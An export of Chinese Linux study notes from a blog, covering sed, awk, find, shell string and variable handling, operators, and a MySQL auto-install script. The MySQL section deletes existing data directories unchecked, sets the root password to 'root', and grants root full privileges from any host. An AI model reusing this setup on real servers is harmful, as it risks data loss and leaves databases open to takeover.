在整行范围内把hello替换为hi。如果没有g标记，则只有每行第一个匹配的hello被替换成hi。 sed ‘s/hello/hi/2’ sed.txt ## 此种写法表示只替换每行的第2个hello为hi sed ‘s/hello/hi/2g’ sed.txt ## 此种写法表示只替换每行的第2个以后的hello为hi（包括第2个） sed -n ‘s/^hello/hi/p’ sed.txt ## (-n)选项和p标志一起使用表示只打印那些发生替换的行。也就是说，如果某一行开头的hello被替换成hi，就打印它。 sed -n ‘2,4p’ sed.txt ## 打印输出sed.txt中的第2行和第4行 sed -n ‘s/hello/&amp;-hi/gp’ sed.txt sed ‘s/^192.168.0.1/&amp;-localhost/‘ sed.txt sed ‘s/^192.168.0.1/[&amp;]/‘ sed.txt ## &amp;符号表示追加一个串到找到的串后, &amp;代表前一个串。 所有以192.168.0.1开头的行都会被替换成它自已加 -localhost，变成192.168.0.1-localhost。 第三句表示给IP地址添加中括号 sed -n ‘s/(liu)jialing/\1tao/p’ sed.txt sed -n ‘s/(liu)jia(ling)/\1tao\2ss/p’ sed.txt ## liu被标记为\1，所以liu会被保留下来（\1 == liu） ## ling被标记为\2，所以ling也会被保留下来（\2 == ling） ## 所以最后的结果就是\1tao\2ss == “liu” + “tao” + “ling” + “ss” 此处切记：\1代表的是被第一个()包含的内容，\1代表的是被第一个()包含的内容，…… 上面命令的意思就是：被括号包含的字符串会保留下来，然后跟其他的字符串比如tao和ss组成新的字符串liutaolingss sed ‘s#hello#hi#g’ sed.txt ## 不论什么字符，紧跟着s命令的都被认为是新的分隔符，所以，”#”在这里是分隔符，代替了默认的”/“分隔符。表示把所有hello替换成hi。 选定行的范围：逗号 sed -n ‘/today/,/hello/p’ sed.txt ## 所有在模板today和hello所确定的范围内的行都被打印。都找第一个，也就是说，从第一个today到第一个hello sed -n ‘5,/^hello/p’ sed.txt sed -n ‘/^hello/,8p’ sed.txt ## 打印从第五行开始到第一个包含以hello开始的行之间的所有行。 sed ‘/today/,/hello/s/$/www/‘ sed.txt ## 对于模板today和hello之间的行，每行的末尾用字符串www替换。 sed ‘/today/,/hello/s/^/www/‘ sed.txt ## 对于模板today和hello之间的行，每行的开头用字符串www替换。 sed ‘/^[A-Za-z]/s/5/five/g’ sed.txt ## 将以字母开头的行中的数字5替换成five 多点编辑：e命令 sed -e ‘1,5d’ -e ‘s/hello/hi/‘ sed.txt ## (-e)选项允许在同一行里执行多条命令。如例子所示，第一条命令删除1至5行，第二条命令用hello替换hi。命令的执行顺序对结果有影响。如果两个命令都是替换命令，那么第一个替换命令将影响第二个替换命令的结果。 sed –expression=’s/hello/hi/‘ –expression=’/today/d’ sed.txt ## 一个比-e更好的命令是–expression。它能给sed表达式赋值。 从文件读入：r命令 sed ‘/hello/r file’ sed.txt ## file里的内容被读进来，显示在与hello匹配的行下面，如果匹配多行，则file的内容将显示在所有匹配行的下面。 写入文件：w命令 sed -n ‘/hello/w file’ sed.txt ## 在huangbo.txt中所有包含hello的行都被写入file里。 追加命令：a命令 sed ‘/^hello/a\—&gt;this is a example’ sed.txt ## ‘—&gt;this is a example’被追加到以hello开头的行(另起一行)后面，sed要求命令a后面有一个反斜杠。 插入：i命令 sed ‘/will/i\some thing new ————————-‘ sed.txt ## 如果test被匹配，则把反斜杠后面的文本插入到匹配行的前面。 下一个：n命令 sed ‘/hello/{n; s/aa/bb/;}’ sed.txt 替换下一行的第一个aa sed ‘/hello/{n; s/aa/bb/g;}’ sed.txt 替换下一行的全部aa ## 如果hello被匹配，则移动到匹配行的下一行，替换这一行的aa，变为bb，并打印该行，然后继续。 退出：q命令 sed ‘10q’ sed.txt ## 打印完第10行后，退出sed。 同样的写法： sed -n ‘1,10p ‘ sed.txt awk(报表生成器)Awk是一个强大的处理文本的编程语言工具，其名称得自于它的创始人Alfred Aho、Peter Weinberger和Brian Kernighan 姓氏的首个字母，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。AWK 提供了极其强大的功能：可以进行样式装入、流控制、数学运算符、进程控制语句甚至于内置的变量和函数。简单来说awk就是扫描文件中的每一行，查找与命令行中所给定内容相匹配的模式。如果发现匹配内容，则进行下一个编程步骤。如果找不到匹配内容，则继续处理下一行。 语法12awk [options] 'script' var=value file(s)awk [options] -f scriptfile var=value file(s) … TODO 待补充 实例 假设last -n 5的输出如下: 123456root@cts1:~ # last -n 5root pts/1 192.168.170.1 Mon May 28 09:28 still logged inroot pts/1 192.168.170.1 Sun May 27 20:53 - 07:21 (10:28)root pts/0 192.168.170.1 Sun May 27 19:39 still logged inreboot system boot 2.6.32-573.el6.x Sun May 27 19:34 - 14:48 (19:13)root pts/1 192.168.170.1 Sat May 26 20:43 - 22:36 (01:53) 只显示五个最近登录的账号： 12345678root@cts1:~ # last -n 5 | awk '&#123;print $1&#125;'rootrootrootrebootroot# awk工作流程是这样的：读入有'\n'换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是"空白键" 或 "[tab]键",所以$1表示登录用户，$3表示登录用户ip,以此类推 显示/etc/passwd的账户： 12345678root@cts1:~ # cat /etc/passwd | awk -F':' '&#123;print $1&#125;'rootbindaemon...# 这种是awk+action的示例，每行都会执行action&#123;print $1&#125;。# -F指定域分隔符为':' 显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割 12345root@cts1:~ # cat /etc/passwd | awk -F':' '&#123;print $1"\t"$7&#125;'root /bin/zshbin /sbin/nologindaemon /sbin/nologin... BEGIN and END 如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加”blue,/bin/nosh”。 123456789101112131415161718root@cts1:~ # cat /etc/passwd |awk -F ':' 'BEGIN &#123;print "name,shell"&#125; &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'---name,shellroot,/bin/zshbin,/sbin/nologin...mysql,/bin/bashblue,/bin/nosh-------------------------root@cts1:~ # cat /etc/passwd | awk -F ':' 'BEGIN &#123;print "name \t shell"&#125; &#123;print$1"\t"$7&#125; END &#123;print "blue,/bin/bash"&#125;'---name shellroot /bin/zshbin /sbin/nologin...mysql /bin/bashblue,/bin/bash awk工作流程是这样的：先执行BEGIN，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录••••••直到所有的记录都读完，最后执行END操作。 搜索/etc/passwd有root关键字的所有行 1234567891011121314151. root@cts1:~ # awk -F: '/root/' /etc/passwd --- root:x:0:0:root:/root:/bin/zsh operator:x:11:0:operator:/root:/sbin/nologin # 这种是pattern的使用示例，匹配了pattern(这里是root)的行才会执行action(没有指定action，默认输出每行的内容)。2. 搜索支持正则，例如找root开头的: awk -F: '/^root/' /etc/passwd# 搜索/etc/passwd有root关键字的所有行，并显示对应的shellroot@cts1:~ # awk -F ':' '/root/&#123;print $7&#125;' /etc/passwd/bin/zsh/sbin/nologin# 这里指定了action&#123;print $7&#125; awk常见内置变量 FILENAME：awk浏览的文件名 FNR：浏览文件的记录数，也就是行数。awk是以行为单位处理的，所以每行就是一个记录 NR：awk读取文件每行内容时的行号 NF：浏览记录的域的个数。可以用它来输出最后一个域 FS：设置输入域分隔符，等价于命令行-F选项 OFS：输出域分隔符 统计/etc/passwd:文件名，每行的行号，每行的列数，对应的完整行内容 1234root@cts1:~ # awk -F ':' '&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;' /etc/passwd---filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/zshfilename:/etc/passwd,linenumber:2,columns:7,linecontent:bin:x:1:1:bin:/bin:/sbin/nologin 使用printf替代print,可以让代码更加简洁，易读 1234root@cts1:~ # awk -F ':' '&#123;printf("filename:%s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd---filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/zshfilename:/etc/passwd,linenumber:2,columns:7,linecontent:bin:x:1:1:bin:/bin:/sbin/nologin 指定输入分隔符，指定输出分隔符： 12345root@cts1:~ # awk 'BEGIN &#123;FS=":"; OFS="\t"&#125; &#123;print $1, $2&#125;' /etc/passwd---root xbin x... 实用例子 1234567891011121314# A：打印最后一列：awk -F: '&#123;print $NF&#125;' /etc/passwdawk -F: '&#123;printf("%s\n",$NF);&#125;' /etc/passwd# B：统计文件行数：awk 'BEGIN &#123;x=0&#125; &#123;x++&#125; END &#123;print x&#125;' /etc/passwd# C：打印9*9乘法表：awk 'BEGIN&#123;for(n=0;n++&lt;9;)&#123;for(i=0;i++&lt;n;)printf i"*"n"="i*n" ";print ""&#125;&#125;'awk 'BEGIN &#123;for(i=1;i&lt;=9;i++)&#123;for(j=1;j&lt;=i;j++)&#123;printf i"*"j"="i*j" ";&#125;print ""&#125;&#125;'awk 'BEGIN &#123;for(i=9;i&gt;=1;i--)&#123;for(j=i;j&gt;=1;j--)&#123;printf i"*"j"="i*j" ";&#125;print ""&#125;&#125;'# D: 计算1-100 之和echo "sum" | awk 'BEGIN &#123;sum=0;&#125; &#123;i=0;while(i&lt;101)&#123;sum+=i;i++&#125;&#125; END &#123;print sum&#125;' 更多详细用法参见官网 find功能： 搜索文件目录层次结构 格式： find path -option actions find &lt;路径&gt; &lt;选项&gt; [表达式] 常用可选项：1234567891011121314151617-name 根据文件名查找，支持(\'\* \' , \'? \')-type 根据文件类型查找(f-普通文件，c-字符设备文件，b-块设备文件，l-链接文件，d-目录)-perm 根据文件的权限查找，比如 755-user 根据文件拥有者查找-group 根据文件所属组寻找文件-size 根据文件小大寻找文件 -o 表达式 或-a 表达式 与-not 表达式 非 类型参数列表：1234567- **f** 普通文件- **l** 符号连接- **d** 目录- **c** 字符设备- **b** 块设备- **s** 套接字- **p** Fifo 示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[linux@linux txt]$ ll ## 准备的测试文件total 248-rw-rw-r--. 1 linux linux 235373 Apr 18 00:10 hw.txt-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 LINUX.pdf-rw-rw-r--. 1 linux linux 3 Apr 22 05:50 liujialing.jpg-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 mingxing.pdf-rw-rw-r--. 1 linux linux 57 Apr 22 04:40 mingxing.txt-rw-rw-r--. 1 linux linux 66 Apr 22 05:15 sort.txt-rw-rw-r--. 1 linux linux 214 Apr 18 10:08 test.txt-rw-rw-r--. 1 linux linux 24 Apr 22 05:27 uniq.txt[linux@linux txt]$ find /home/linux/txt/ -name "*.txt" ## 查找文件名txt结尾的文件/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txt## 忽略大小写查找文件名包含linux[linux@linux txt]$ find /home/linux/txt -iname "*linux*" /home/linux/txt/LINUX.pdf## 查找文件名结尾是.txt或者.jpg的文件[linux@linux txt]$ find /home/linux/txt/ \( -name "*.txt" -o -name "*.jpg" \) /home/linux/txt/liujialing.jpg/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txt另一种写法：find /home/linux/txt/ -name "*.txt" -o -name "*.jpg"# 使用正则表达式的方式去查找上面条件的文件：[linux@linux txt]$ find /home/linux/txt/ -regex ".*\(\.txt\|\.jpg\)$"/home/linux/txt/liujialing.jpg/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txt## 查找.jpg结尾的文件，然后删掉[linux@linux txt]$ find /home/linux/txt -type f -name "*.jpg" -delete[linux@linux txt]$ lltotal 248-rw-rw-r--. 1 linux linux 235373 Apr 18 00:10 hw.txt-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 LINUX.pdf-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 mingxing.pdf-rw-rw-r--. 1 linux linux 57 Apr 22 04:40 mingxing.txt-rw-rw-r--. 1 linux linux 66 Apr 22 05:15 sort.txt-rw-rw-r--. 1 linux linux 214 Apr 18 10:08 test.txt-rw-rw-r--. 1 linux linux 24 Apr 22 05:27 uniq.txt## 查找5天以内创建的 .sh 文件, 并显示创建/更改时间find / -name "*sh" -mtime -5 |xargs ls -l 3. Shell操作字符串字符串截取Linux中操作字符串，也是一项必备的技能。其中尤以截取字符串更加频繁，下面为大家介绍几种常用方式，截取字符串 预先定义一个变量：WEBSITE=’http://hadoop//centos/huangbo.html&#39; #截取，*任意的, 删除//左边字符串（包括制定的分隔符），保留右边字符串 root@cts1:~ # echo ${WEBSITE#*//}hadoop//centos/huangbo.html ##截取，删除左边字符串（包括指定的分隔符），保留右边字符串，和上边一个#不同的是，它一直找到最后，而不是像一个#那样找到一个就满足条件退出了。 root@cts1:~ # echo ${WEBSITE##*//}centos/huangbo.html %截取，删除右边字符串（包括制定的分隔符），保留左边字符串 root@cts1:~ # echo ${WEBSITE%//*}http://hadoop %%截取，删除右边字符串（包括指定的分隔符），保留左边字符串，和上边一个%不同的是，它一直找到最前，而不是像一个%那样找到一个就满足条件退出了。 root@cts1:~ # echo ${WEBSITE%%//*}http: 从左边第几个字符开始，以及截取的字符的个数 root@cts1:~ # echo ${WEBSITE:2:2}tp 从左边第几个字符开始，一直到结束 root@cts1:~ # echo ${WEBSITE:2}tp://hadoop//centos/huangbo.html 从右边第几个字符开始，以及字符的个数, 从-4开始, 还是往右边截取 root@cts1:~ # echo ${WEBSITE:0-4:2 ht 从右边第几个字符开始，一直到结束 root@cts1:~ # echo ${WEBSITE:0-4}html 利用awk进行字符串截取 echo $WEBSITE | awk ‘{print substr($1,2,6)}’ ttp:// 利用cut进行字符串截取 root@cts1:~ # echo $WEBSITE | cut -b 1-4 http 获取最后几个字符 root@cts1:~ # echo ${WEBSITE:(-3)} tml 截取从倒数第3个字符后的2个字符 root@cts1:~ # echo ${WEBSITE:(-3):2}tm 字符串替换使用格式 ${parameter/pattern/string} 例子12345678910# 定义变量VAR：[linux@linux ~]$ VAR="hello tom, hello kitty, hello xiaoming"# 替换第一个hello, 用`/`：[linux@linux ~]$ echo $&#123;VAR/hello/hi&#125;hi tom, hello kitty, hello xiaoming# 替换所有hello, 用'//'：[linux@linux ~]$ echo $&#123;VAR//hello/hi&#125;hi tom, hi kitty, hi xiaoming 获取字符串长度在此为大家提供五种方式获取某字符串的长度 123456789101112131415161718192021222324252627282930313233343536# 在此为大家提供五种方式获取某字符串的长度# 1. 使用wc -L命令+----------------------------------------------------+| echo $&#123;WEBSITE&#125; |wc -L || || 35 |+----------------------------------------------------+# 2. 使用expr的方式去计算+---------------------------------------------------+| expr length $&#123;WEBSITE&#125; || || 35 |+---------------------------------------------------+# 3. 通过awk + length的方式获取字符串长度+---------------------------------------------------------------------------+|echo $&#123;WEBSITE&#125; | awk '&#123;print length($0)&#125;' || || 35 |+---------------------------------------------------------------------------+# 4. 通过awk的方式计算以**\"\"**分隔的字段个数+-------------------------------------------------------------------------+| echo $&#123;WEBSITE&#125; |awk -F "" '&#123;print NF&#125;' || || 35 |+-------------------------------------------------------------------------+# 5. 通过\#的方式获取字符串（最简单，最常用）+----------------------------------------------+| echo $&#123;#WEBSITE&#125; || || 35 |+----------------------------------------------+ 4. 脚本自动安装MySql这里先做个记录, 之后会整理一份更详细的文档出来.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/bin/bash## auto install mysql## 假如是第二次装，那么要先停掉服务，并且卸载之前的mysqlservice mysql stopEXISTS_RPMS=`rpm -qa | grep -i mysql`echo $&#123;EXISTS_RPMS&#125;for RPM in $&#123;EXISTS_RPMS&#125;do rpm -e --nodeps $&#123;RPM&#125;done## 删除残留文件rm -fr /usr/lib/mysqlrm -fr /usr/include/mysqlrm -f /etc/my.cnfrm -fr /var/lib/mysql## 从服务器获取安装mysql的rpm包wget http://linux/soft/MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpmwget http://linux/soft/MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## 删除之前的密码文件，以免产生干扰rm -rf /root/.mysql_secret## 安装服务器rpm -ivh MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## 获取到生成的随机密码##PSWD=`cat /root/.mysql_secret | awk -F ':' '&#123;print substr($4,2,16)&#125;'`PSWD=` grep -v '^$' /root/.mysql_secret | awk -F ':' '&#123;print substr($4,2,16)&#125;'`##PSWD=$&#123;PWD:1:16&#125;## 安装客户端rpm -ivh MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpm## 然后删除刚刚下下来的rpm包rm -rf MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpmrm -rf MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## 提示安装的步骤都完成了。echo "install mysql server and client is done .!!!!!!"## 打印出来刚刚生成的mysql初始密码echo "random password is:$&#123;PSWD&#125;"## 开启mysql服务service mysql start# 手动第一次登陆，然后改掉密码[root@hadoop bin]# mysql -uroot -pZjVIWvOGD18bT7oXmysql&gt; set PASSWORD=PASSWORD('root');# 现在就可以写脚本链接mysql进行操作了[root@hadoop bin]# vi initMysql.sh#!/bin/bashmysql -uroot -proot &lt;&lt; EOF GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; FLUSH PRIVILEGES; use mysql; select host, user, password from user;EOF]]></content>
      <categories>
        <category>Linux</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记-4]]></title>
    <url>%2F2018%2F05%2F28%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4%2F</url>
    <content type="text"><![CDATA[1、Linux shell简介1.1、Shell概述Shell本身是一个用C语言编写的程序，它是用户使用Unix/Linux的桥梁，用户的大部分工作都是通过Shell完成的。 Shell既是一种命令语言，又是一种程序设计语言： 作为命令语言，它交互式地解释和执行用户输入的命令； 作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。 Shell它虽然不是Unix/Linux系统内核的一部分，但它调用了系统核心的大部分功能来执行程序、建立文件并以并行的方式协调各个程序的运行。Shell是用户与内核进行交互操作的一种接口，目前最流行的Shell称为bash Shell（Bourne Again Shell） Shell是一门编程语言(解释型的编程语言)，即shell脚本(就是在用linux的shell命令编程)，Shell脚本程序从脚本中一行一行读取并执行这些命令，相当于一个用户把脚本中的命令一行一行敲到Shell提示符下执行 Shell是一种脚本语言，那么，就必须有解释器来执行这些脚本 Unix/Linux上常见的Shell脚本解释器有bash、sh、csh、ksh等，习惯上把它们称作一种Shell。我们常说有多少种Shell，其实说的是Shell脚本解释器，可以通过cat /etc/shells命令查看系统中安装的shell，不同的shell可能支持的命令语法是不相同的 sh是Unix 标准默认的shell，由Steve Bourne开发，是Bourne Shell的缩写。 bash是Linux标准默认的shell，本教程也基于bash讲解。bash由Brian Fox和Chet Ramey共同完成，是Bourne Again Shell的缩写。 Shell本身支持的命令并不多，内部命令一共有40个，但是它可以调用其他的程序，每个程序就是一个命令，这使得Shell命令的数量可以无限扩展，其结果就是Shell的功能非常强大，完全能够胜任Linux的日常管理工作，如文本或字符串检索、文件的查找或创建、大规模软件的自动部署、更改系统设置、监控服务器性能、发送报警邮件、抓取网页内容、压缩文件等。 1.2、Shell基本格式代码写在普通文本文件中，通常以.sh结尾，虽然不是强制要求，但希望大家最好这么做 12345vi helloworld.sh--------------------------#!/bin/bash ## 表示用哪一种shell解析器来解析执行我们的这个脚本程序，这句话只对自执行有效，对于使用sh helloworld.sh无效echo "hello world" ## 注释也可以写在这里 在这里，我们就写好了一个shell脚本，第一行是固定需要的，表明用哪一种shell解析器来执行我们的这个脚本程序。本质上，shell脚本里面的代码都是就是一些流程控制语句加一些特殊语法再加shell**命令**组成。其中，我们可以当做每一个命令就是shell编程当中的关键字。 1.3、Shell执行方式1 、sh 方式或者bash 方式 sh helloworld.sh bash helloworld.sh ## 直接指定用系统默认的bash shell解释执行 2 、source 方式或者. 方式 source命令也称为“点命令”，也就是一个点符号（.）,是bash的内部命令。 功能：使Shell读入指定的Shell程序文件并依次执行文件中的所有语句 source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。 用法： . helloworld.sh source helloworld.sh 3 、直接执行该脚本文件 可以有两种方式，不过这两种方式的执行，都需要该文件有执行权限 所以在执行之前，我们要更改他的执行权限 1、 切换到该文件所在的路径然后执行命令： ./helloworld.sh 2、 直接以绝对路径方式执行 /home/linux/hellworld.sh 1.4、Shell注释单行注释：Shell脚本中以#开头的代码就是注释 # xxx 多行注释：Shell脚本中也可以使用多行注释：:&lt;&lt;! xxx ! 2、Shell基本语法2.1、变量2.1.1、系统变量Linux Shell中的变量分为“系统变量”和“用户自定义变量” 系统变量可以通过set命令查看，用户环境变量可以通过env查看： 常用系统变量：\$PWD \$SHELL \$USER $HOME 2.1.2、自定义变量12345678910111213141516171819# 1.注意, 变量中间不能有空格A=123 echo $A# 2.变量中间有空格的话要加引号 - 双引号中间可以引用变量 a=zs b="this is $a" echo $b this is zs - 单引号引用变量会原样输出 b='this is $a' echo $b this is $a # 3. 要在变量后直接连接字符, 要用&#123;&#125;把变量括起来 $&#123;变量名&#125;其它字符 echo $&#123;A&#125;ddd helloddd 2.1.3、变量高级用法 撤销变量：unset ABC 声明静态变量：readonly ABC= ‘abc’ 特点是这种变量是只读的，不能unset 在一个 .sh 中. 以绝对路径的形式调另一个 .sh 使用export关键字 export A=”A in a.sh” 意味着把变量提升为当前shell 进程中的全局环境变量，可供其他子shell 程序使用， A 变量就成了a.sh 脚本所在bash 进程的全局变量，该进程的所有子进程都能访问到变量A 通过 . /root/bin/b.sh 或 source /root/bin/b.sh 来调用 总结： a.sh中直接调用b.sh，会让b.sh在A所在的bash进程的“子进程”空间中执行 而子进程空间只能访问父进程中用export定义的变量 一个shell进程无法将自己定义的变量提升到父进程空间中去 source或者“.”号执行脚本时，会让脚本在调用者所在的shell进程空间中执行 2.1.4、反引号赋值 a=`ls -l /root/bin` ##反引号，运行里面的命令，并把结果返回给变量a 另外一种写法：a=$(ls -l /root/bin) 2.1.5、变量有用技巧 形式 说明 ${var} 变量本来的值 ${var:-word} 如果变量 var 为空或已被删除(unset)，那么返回 word，但不改变 var 的值 ${var:+word} 如果变量 var 被定义，那么返回word，但不改变 var 的值 ${var:=word} 如果变量 var 为空或已被删除(unset)，那么返回 word，并将 var 的值设置为 word ${var:?message} 如果变量 var 为空或已被删除(unset)，那么将消息 message 送到标准错误输出，可以用来检测变量 var 是否可以被正常赋值。 若此替换出现在Shell脚本中，那么脚本将停止运行 2.1.6 特殊变量 $? 表示上一个命令退出的状态码 $$ 表示当前进程编号 $0 表示当前脚本名称 $n 表示n 位置的输入参数（n**代表数字，n&gt;=1 ）** $# 表示参数的个数，常用于循环 $* 和$@ 都表示参数列表 注意：$*与$@区别 $* 和 $@ 都表示传递给函数或脚本的所有参数** 不被双引号” “包含时 $* 和 $@ 都以\$1 \$2 … \$n 的形式组成参数列表 当它们被双引号” “包含时 “$*“ 会将所有的参数作为一个整体，以”\$1 \$2 … \$n”的形式组成一个整串； $* 会将各个参数分开，以”\$1” “\$2” … “\$n” 的形式组成一个参数列表 2.1.7 变量的其他注意点 使用变量 使用一个定义过的变量, 只需要在变量名前面加 $ 符号 如果变量后面直接跟上了字符串, 就必须要加花括号 推荐给所有变量加上花括号, 这个是好的编程习惯 已定义的非只读变量, 可以被重新定义 只读变量 使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。 1234567#!/bin/bashmyUrl="http://www.w3cschool.cc"readonly myUrlmyUrl="http://www.runoob.com"---# 会报错zsh: read-only variable: myUrl 删除变量, 只读变量不能删除, 变量被删除后不能再次使用 1unset variable_name 变量类型 1) 局部变量 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。 2) 环境变量 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。 3) shell变量 shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行 2.18 字符串获取字符串长度12string="abcd"echo $&#123;#string&#125; #输出 4 提取子字符串以下实例从字符串第 2 个字符开始截取 4 个字符： 12string="runoob is a great site"echo $&#123;string:1:4&#125; # 输出 unoo 查找子字符串查找字符 “i 或 s“ 的位置： 12string="runoob is a great company"echo `expr index "$string" is` # 输出 8 2.19 Shell 数组 bash支持一维数组（不支持多维数组），并且没有限定数组的大小。 类似与C语言，数组元素的下标由0开始编号。获取数组中的元素要利用下标，下标可以是整数或算术表达式，其值应大于或等于0。 定义数组在Shell中，用括号来表示数组，数组元素用”空格”符号分割开。定义数组的一般形式为： 1数组名=(值1 值2 ... 值n) 还可以单独定义数组的各个分量： 123array_name[0]=value0array_name[1]=value1array_name[n]=valuen 可以不使用连续的下标，而且下标的范围没有限制。 获取数组的长度 获取数组长度的方法与获取字符串长度的方法相同，例如： 123456# 取得数组元素的个数length=$&#123;#array_name[@]&#125;# 或者length=$&#123;#array_name[*]&#125;# 取得数组单个元素的长度lengthn=$&#123;#array_name[n]&#125; 2.2、运算符2.2.1、算数运算符1. 用expr12345678格式 expr m + n 注意expr运算符间要有空格例如计算（2＋3）×4 的值1、分步计算 S=`expr 2 + 3` expr $S \* 4 ## *号需要转义2、一步完成计算 expr `expr 2 + 3 ` \* 4 echo `expr \`expr 2 + 3\` \* 4` 用expr还可以计算字符串的长度，子字符串出现的位置，截取字符串等等 123456789cts1 ~ # name='woshishuaige'cts1 ~ # expr length name4cts1 ~ # expr length $name12cts1 ~ # expr index $name shuai3cts1 ~ # expr substr $name 6 2sh 详情请翻阅: expr –help 2. 用(())12345678((1+2))(((2+3)*4))count=1((count++))((++count))echo $count# 但是要想取到运算结果，需要用$引用a=$((1+2)) 3. 用\$[]12345SS=$[2+3]echo $SSSS=$[2*3]echo $SSecho $[(2 + 3)*3] 4. 用let1234first=1second=2let third=first+secondecho $&#123;third&#125; 5. 用 | bc以上命令都只对整形数值有效，不适用于浮点数 如果有浮点数参与运算，可以将echo与bc命令结合起来使用，代码如下 123456echo "1.212*3" | bc ## 简单浮点运算echo "scale=2;3/8" | bc ##将输出结果设置为2位echo "obase=2;127" | bc ##输出运算结果的二进制echo "obase=10;ibase=2;101111111" | bc ##将二进制转换成十进制echo "10^10" | bc ##求幂指数echo "sqrt(100)" | bc ##开平方 除了用bc做尽职转换以外，还可以这样做： 12345echo $((base#number)) 表示把任意base进制的数number转换成十进制例子：echo $((8#377)) 返回255echo $((025)) 返回21 ， 八进制echo $((0xA4)) 返回164 ， 十六进制 使用bc还可以用来比较浮点数的大小： 12345678910111213[root@hadoop02 bin]# echo "1.2 &lt; 2" |bc1[root@hadoop02 bin]# echo "1.2 &gt; 2" |bc0[root@hadoop02 bin]# echo "1.2 == 2.2" |bc0[root@hadoop02 bin]# echo "1.2 != 2.2" |bc1看出规律了嘛？运算如果为真返回 1，否则返回 0，写一个例子：[root@hadoop02 bin]# [ $(echo "2.2 &gt; 2" |bc) -eq 1 ] &amp;&amp; echo yes || echo noyes[root@hadoop02 bin]# [ $(echo "2.2 &lt; 2" |bc) -eq 1 ] &amp;&amp; echo yes || echo nono 2.2.2、关系运算符下面给出一张关系运算符的列表： 运算符 等同运算符 说明 -eq = 检测两个数是否相等，相等返回true -ne != 检测两个数是否相等，不相等返回true -ge &gt;= 检测左边的数是否大等于右边的，如果是，则返回true -gt &gt; 检测左边的数是否大于右边的，如果是，则返回true -le &lt;= 检测左边的数是否小于等于右边的，如果是，则返回true -lt &lt; 检测左边的数是否小于右边的，如果是，则返回true 2.2.3、布尔运算符 运算符 等同运算符 说明 ! ! 非运算，表达式为 true 则返回false，否则返回true -a &amp;&amp; 与运算，两个表达式都为true 才返回true -o \ \ 或运算，有一个表达式为true 则返回true 2.2.4、字符串运算符 运算符 说明 = 检测两个字符串是否相等，相等返回true != 检测两个字符串是否相等，不相等返回true -z 检测字符串长度是否为0，为0返回true -n 检测字符串长度是否为0，不为0返回true str 检测字符串是否为空，不为空返回true 2.2.5、文件运算符 运算符 说明 -d 检测文件是否是目录，如果是，则返回true -f 检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回true -e 检测文件（包括目录）是否存在，如果是，则返回true -s 检测文件是否为空（文件大小是否大于0），不为空返回true -r 检测文件是否可读，如果是，则返回true -w 检测文件是否可写，如果是，则返回true -x 检测文件是否可执行，如果是，则返回true -b 检测文件是否是块设备文件，如果是，则返回true -c 检测文件是否是字符设备文件，如果是，则返回true 2.3、流程控制2.3.1、ifif.. then ..elif.. then.. else..fi123456789101112131415161718192021222324252627282930313233343536# if语法格式：if conditionthen statements [elif condition then statements. ..] [else statements ] fi# 示例程序：[root@hadoop02 bin]# vi g.sh#!/bin/bash## read a value for NAME from stdinread -p "please input your name:" NAME## printf '%s\n' $NAMEif [ $NAME = root ]thenecho "hello $&#123;NAME&#125;, welcome !"elif [ $NAME = hadoop ]then echo "hello $&#123;NAME&#125;, welcome !"else echo "I don’t know you !"fi## 规则解释[ condition ] (注：condition前后要有空格)#非空返回true，可使用$?验证（0为true，&gt;1为false）[ hadoop ]#空返回false[ ]# 注意[ ]内部的=周边的空格 三元运算符12[ condition ] &amp;&amp; echo OK || echo notok# 